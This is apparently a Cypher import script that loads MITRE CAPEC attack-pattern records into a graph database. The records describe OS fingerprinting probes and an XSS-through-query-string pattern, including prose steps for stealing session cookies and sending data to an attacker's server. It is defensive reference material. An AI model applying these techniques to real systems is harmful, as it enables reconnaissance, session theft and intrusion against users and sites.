CREATE (:AttackPrerequisite{id: 268, text: "<div level=\"0\">\n  <p class=\"text\">The ability to monitor network communications.</p>\n  <p class=\"text\">Access to at least one host, and the privileges to interface with the network interface card.</p>\n</div>"});
CREATE (:Submission{id: 295});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 227});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 289, summary: "OrderedDict([('Text', 'An adversary engages in activity to detect the version or type of OS software in a an environment by passively monitoring communication between devices, nodes, or applications. Passive techniques for operating system detection send no actual probes to a target, but monitor network or client-server communication between nodes in order to identify operating systems based on observed behavior as compared to a database of known signatures or values. While passive OS fingerprinting is not usually as reliable as active methods, it is generally better able to evade detection.')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.313.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.313.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.313.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Chapter 8. Remote OS Detection", publisher: "Insecure.com LLC", pubdate: "2008"});
MERGE (:Reference{id: "REF-10", local_id: "R.313.4", author: "Gordon \"Fyodor\" Lyon", title: "The Art of Port Scanning", pubdate: "1997", link: "http://www.phrack.org/issues.html?issue=51&id=11#article"});
CREATE (:ResourcesRequired{id: 182, text: "<div level=\"0\">\n  <p class=\"text\">Any tool capable of monitoring network communications, like a packet sniffer (e.g., Wireshark)</p>\n</div>"});
CREATE (:AttackPattern{id: 314, name: "DEPRECATED: IP Fingerprinting Probes", status: "Deprecated", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 296});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 228});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, References, Related_Attack_Patterns, Resources_Required, Target_Attack_Surface, Target_Attack_Surface_Localities, Target_Attack_Surface_Types, Target_Functional_Services, Targeted_OSI_Layers, Typical_Severity"});
CREATE (:PreviousEntryName{id: 64, name: "IP Fingerprinting Probes"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 290, summary: "OrderedDict([('Text', 'This pattern has been deprecated as it was determined to be an unnecessary layer of abstraction. Please refer to the standard level pattern CAPEC-312 : Active OS Fingerprinting going forward, or to any of the detailed patterns that children of CAPEC-312.')])"});
CREATE (:AttackPattern{id: 315, name: "DEPRECATED: TCP/IP Fingerprinting Probes", status: "Deprecated", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 297});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 229});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, References, Related_Attack_Patterns, Target_Attack_Surface, Target_Attack_Surface_Localities, Target_Attack_Surface_Types, Target_Functional_Services, Targeted_OSI_Layers, Typical_Severity"});
CREATE (:PreviousEntryName{id: 65, name: "TCP/IP Fingerprinting Probes"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 291, summary: "OrderedDict([('Text', 'This pattern has been deprecated as it was determined to be an unnecessary layer of abstraction. Please refer to the standard level pattern CAPEC-312 : Active OS Fingerprinting going forward, or to any of the detailed patterns that children of CAPEC-312.')])"});
CREATE (:AttackPattern{id: 316, name: "DEPRECATED: ICMP Fingerprinting Probes", status: "Deprecated", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 298});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 230});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, References, Related_Attack_Patterns, Target_Attack_Surface, Target_Attack_Surface_Localities, Target_Attack_Surface_Types, Target_Functional_Services, Targeted_OSI_Layers, Typical_Severity"});
CREATE (:PreviousEntryName{id: 66, name: "ICMP Fingerprinting Probes"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 292, summary: "OrderedDict([('Text', 'This pattern has been deprecated as it was determined to be an unnecessary layer of abstraction. Please refer to the standard level pattern CAPEC-312 : Active OS Fingerprinting going forward, or to any of the detailed patterns that children of CAPEC-312.')])"});
CREATE (:AttackPattern{id: 317, name: "IP ID Sequencing Probe", status: "Stable", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:Submission{id: 299});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 231});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Related_Attack_Patterns, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 293, summary: "OrderedDict([('Text', \"This OS fingerprinting probe analyzes the IP 'ID' field sequence number generation algorithm of a remote host. Operating systems generate IP 'ID' numbers differently, allowing an attacker to identify the operating system of the host by examining how is assigns ID numbers when generating response packets. RFC 791 does not specify how ID numbers are chosen or their ranges, so ID sequence generation differs from implementation to implementation. There are two kinds of IP 'ID' sequence number analysis:\"), ('Block', OrderedDict([('@Block_Nature', 'List'), ('Text', [\"1. IP 'ID' Sequencing: Analyzing the IP 'ID' sequence generation algorithm for one protocol used by a host.\", \"2. Shared IP 'ID' Sequencing: Analyzing the packet ordering via IP 'ID' values spanning multiple protocols, such as between ICMP and TCP.\"])]))])"});
MERGE (:Reference{id: "REF-20", local_id: "R.317.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.317.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.317.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Chapter 8. Remote OS Detection", publisher: "Insecure.com LLC", pubdate: "2008"});
MERGE (:Reference{id: "REF-10", local_id: "R.317.4", author: "Gordon \"Fyodor\" Lyon", title: "The Art of Port Scanning", pubdate: "1997", link: "http://www.phrack.org/issues.html?issue=51&id=11#article"});
CREATE (:AttackPattern{id: 318, name: "IP 'ID' Echoed Byte-Order Probe", status: "Stable", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:Submission{id: 300});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 232});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Related_Attack_Patterns, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 294, summary: "OrderedDict([('Text', \"This OS fingerprinting probe tests to determine if the remote host echoes back the IP 'ID' value from the probe packet. An attacker sends a UDP datagram with an arbitrary IP 'ID' value to a closed port on the remote host to observe the manner in which this bit is echoed back in the ICMP error message. The identification field (ID) is typically utilized for reassembling a fragmented packet. Some operating systems or router firmware reverse the bit order of the ID field when echoing the IP Header portion of the original datagram within an ICMP error message.\")])"});
MERGE (:Reference{id: "REF-20", local_id: "R.318.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.318.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.318.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Chapter 8. Remote OS Detection", publisher: "Insecure.com LLC", pubdate: "2008"});
MERGE (:Reference{id: "REF-10", local_id: "R.318.4", author: "Gordon \"Fyodor\" Lyon", title: "The Art of Port Scanning", pubdate: "1997", link: "http://www.phrack.org/issues.html?issue=51&id=11#article"});
CREATE (:AttackPattern{id: 319, name: "IP (DF) 'Don't Fragment Bit' Echoing Probe", status: "Stable", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:Submission{id: 301});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 233});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Related_Attack_Patterns, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 295, summary: "OrderedDict([('Text', \"This OS fingerprinting probe tests to determine if the remote host echoes back the IP 'DF' (Don't Fragment) bit in a response packet. An attacker sends a UDP datagram with the DF bit set to a closed port on the remote host to observe whether the 'DF' bit is set in the response packet. Some operating systems will echo the bit in the ICMP error message while others will zero out the bit in the response packet.\")])"});
MERGE (:Reference{id: "REF-20", local_id: "R.319.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.319.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.319.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Chapter 8. Remote OS Detection", publisher: "Insecure.com LLC", pubdate: "2008"});
MERGE (:Reference{id: "REF-10", local_id: "R.319.4", author: "Gordon \"Fyodor\" Lyon", title: "The Art of Port Scanning", pubdate: "1997", link: "http://www.phrack.org/issues.html?issue=51&id=11#article"});
CREATE (:AttackPattern{id: 32, name: "XSS Through HTTP Query Strings", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 269, text: "<div level=\"0\">\n  <p class=\"text\">Target client software must allow scripting such as JavaScript. Server software must allow display of remote generated HTML without sufficient input or output validation.</p>\n</div>"});
CREATE (:Submission{id: 302});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 234});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Modification{id: 235});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Modification{id: 236});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Modification{id: 237});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Phases, Description Summary, Related_Attack_Patterns, Related_Weaknesses"});
CREATE (:PreviousEntryName{id: 67, name: "Embedding Scripts in HTTP Query Strings"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 296, summary: "OrderedDict([('Text', \"An adversary embeds malicious script code in the parameters of an HTTP query string and convinces a victim to submit the HTTP request that contains the query string to a vulnerable web application. The web application then procedes to use the values parameters without properly validation them first and generates the HTML code that will be executed by the victim's browser.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Spider", description: "<div level=\"0\">\n  <p class=\"text\">Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the links he finds.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">URL parameters are used by the application or the browser (DOM)</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Using URL rewriting, parameters may be part of the URL path.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">No parameters appear on the URL. Even though none appear, the web application may still use them if they are provided.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Application could use POST variable as GET inside the application. Therefore, looking for POST parameters and adding them to the query string.</p>\n</div>"});
CREATE (:Indicator{id: 5, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of URLs, with their corresponding parameters is created by the attacker."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Attempt variations on input parameters", description: "<div level=\"0\">\n  <p class=\"text\">Possibly using an automated tool, an attacker requests variations on the URLs he spidered before. He sends parameters that include variations of payloads. He records all the responses from the server that include unmodified versions of his script.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a list of XSS probe strings to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record results of manual input of XSS probes in known URLs.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The output of pages includes some form of a URL parameter. E.g., ?error=\"File not Found\" becomes \"File not Found\" in the title of the web page.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Input parameters become part of JavaScript, VBScript, or other script in a web page.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Nothing is returned to the web page. It may be a stored XSS. The unique identifier from the probe helps to trace the flow of the possible XSS.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker's cross-site scripting string is repeated back verbatim at some point in the web site (if not on the same page). Note that sometimes, the payload might be well encoded in the page, but wouldn't be encoded at all in some other section of the same web page (title, script, etc.)"});
CREATE (:Outcome{id: 2, type: "Failure", description: "All HTML-sensitive characters are consistently re-encoded before being sent to the web browser."});
CREATE (:Outcome{id: 3, type: "Inconclusive", description: "Some sensitive characters are consistently encoded, but others are not."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Steal session IDs, credentials, page content, etc.", description: "<div level=\"0\">\n  <p class=\"text\">As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker gets the user's cookies or other session identifiers."});
CREATE (:Outcome{id: 2, type: "Success", description: "The attacker gets the content of the page the user is viewing."});
CREATE (:Outcome{id: 3, type: "Success", description: "The attacker causes the user's browser to visit a page with malicious content."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
CREATE (:AttackStep{id: 2, title: "Forceful browsing", description: "<div level=\"0\">\n  <p class=\"text\">When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker indirectly controls the user's browser and makes it performing actions exploiting CSRF."});
CREATE (:Outcome{id: 2, type: "Success", description: "The attacker manipulates the browser through the steps that he designed in his attack. The user, identified on a website, is now performing actions he is not aware of."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
CREATE (:AttackStep{id: 3, title: "Content spoofing", description: "<div level=\"0\">\n  <p class=\"text\">By manipulating the content, the attacker targets the information that the user would like to get from the website.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The user sees a page containing wrong information"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
MERGE (:Reference{id: "REF-2", local_id: "R.32.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:CWE{id: 80});
CREATE (:ResourcesRequired{id: 183, text: "<div level=\"0\">\n  <p class=\"text\">Ability to send HTTP post to scripting host and collect output</p>\n</div>"});
CREATE (:AttackPattern{id: 320, name: "TCP Timestamp Probe", status: "Stable", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 270, text: "<div level=\"0\">\n  <p class=\"text\">The ability to monitor and interact with network communications.</p>\n  <p class=\"text\">Access to at least one host, and the privileges to interface with the network interface card.</p>\n  <p class=\"text\">The target OS must support the TCP timestamp option in order to obtain a fingerprint.</p>\n</div>"});
CREATE (:Submission{id: 303});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 238});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 297, summary: "OrderedDict([('Text', \"This OS fingerprinting probe examines the remote server's implementation of TCP timestamps. Not all operating systems implement timestamps within the TCP header, but when timestamps are used then this provides the attacker with a means to guess the operating system of the target. The attacker begins by probing any active TCP service in order to get response which contains a TCP timestamp. Different Operating systems update the timestamp value using different intervals. This type of analysis is most accurate when multiple timestamp responses are received and then analyzed. TCP timestamps can be found in the TCP Options field of the TCP header.\"), ('Block', OrderedDict([('@Block_Nature', 'List'), ('Text', ['1. The adversary sends a probe packet to the remote host to identify if timestamps are present.', '2. If the remote host is using timestamp, the adversary sends several requests and records the timestamp values.', '3. The adversary analyzes the timestamp values and determines an average increments per second in the timestamps for the target.', '3. The adversary compares this result to a database of known TCP timestamp increments for a possible match.'])]))])"});
MERGE (:Reference{id: "REF-20", local_id: "R.320.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.320.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.320.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Chapter 8. Remote OS Detection", publisher: "Insecure.com LLC", pubdate: "2008"});
CREATE (:ResourcesRequired{id: 184, text: "<div level=\"0\">\n  <p class=\"text\">Any type of active probing that involves non-standard packet headers requires the use of raw sockets, which is not available on particular operating systems (Microsoft Windows XP SP 2, for example). Raw socket manipulation on Unix/Linux requires root privileges.</p>\n  <p class=\"text\">A tool capable of sending and receiving packets from a remote system.</p>\n</div>"});
CREATE (:AttackPattern{id: 321, name: "TCP Sequence Number Probe", status: "Stable", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 271, text: "<div level=\"0\">\n  <p class=\"text\">The ability to monitor and interact with network communications.</p>\n  <p class=\"text\">Access to at least one host, and the privileges to interface with the network interface card.</p>\n</div>"});
CREATE (:Submission{id: 304});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 239});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 298, summary: "OrderedDict([('Text', \"This OS fingerprinting probe tests the target system's assignment of TCP sequence numbers. One common way to test TCP Sequence Number generation is to send a probe packet to an open port on the target and then compare the how the Sequence Number generated by the target relates to the Acknowledgement Number in the probe packet. Different operating systems assign Sequence Numbers differently, so a fingerprint of the operating system can be obtained by categorizing the relationship between the acknowledgement number and sequence number as follows:\"), ('Block', OrderedDict([('@Block_Nature', 'List'), ('Text', ['1. The Sequence Number generated by the target is Zero.', '2. The Sequence Number generated by the target is the same as the acknowledgement number in the probe', '3. The Sequence Number generated by the target is the acknowledgement number plus one', '3. The Sequence Number is any other non-zero number.'])]))])"});
MERGE (:Reference{id: "REF-20", local_id: "R.321.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 55-56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.321.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.321.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Chapter 8. Remote OS Detection", publisher: "Insecure.com LLC", pubdate: "2008"});
CREATE (:ResourcesRequired{id: 185, text: "<div level=\"0\">\n  <p class=\"text\">A tool capable of sending and receiving packets from a remote system.</p>\n</div>"});
CREATE (:AttackPattern{id: 322, name: "TCP (ISN) Greatest Common Divisor Probe", status: "Stable", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 272, text: "<div level=\"0\">\n  <p class=\"text\">The ability to monitor and interact with network communications.</p>\n  <p class=\"text\">Access to at least one host, and the privileges to interface with the network interface card.</p>\n</div>"});
CREATE (:Submission{id: 305});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 240});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 299, summary: "OrderedDict([('Text', 'This OS fingerprinting probe sends a number of TCP SYN packets to an open port of a remote machine. The Initial Sequence Number (ISN) in each of the SYN/ACK response packets is analyzed to determine the smallest number that the target host uses when incrementing sequence numbers. This information can be useful for identifying an operating system because particular operating systems and versions increment sequence numbers using different values. The result of the analysis is then compared against a database of OS behaviors to determine the OS type and/or version.')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.322.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.322.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.322.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Chapter 8. Remote OS Detection", publisher: "Insecure.com LLC", pubdate: "2008"});
CREATE (:ResourcesRequired{id: 186, text: "<div level=\"0\">\n  <p class=\"text\">A tool capable of sending and receiving packets from a remote system.</p>\n</div>"});
CREATE (:AttackPattern{id: 323, name: "TCP (ISN) Counter Rate Probe", status: "Stable", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 273, text: "<div level=\"0\">\n  <p class=\"text\">The ability to monitor and interact with network communications.</p>\n  <p class=\"text\">Access to at least one host, and the privileges to interface with the network interface card.</p>\n</div>"});
CREATE (:Submission{id: 306});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 241});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
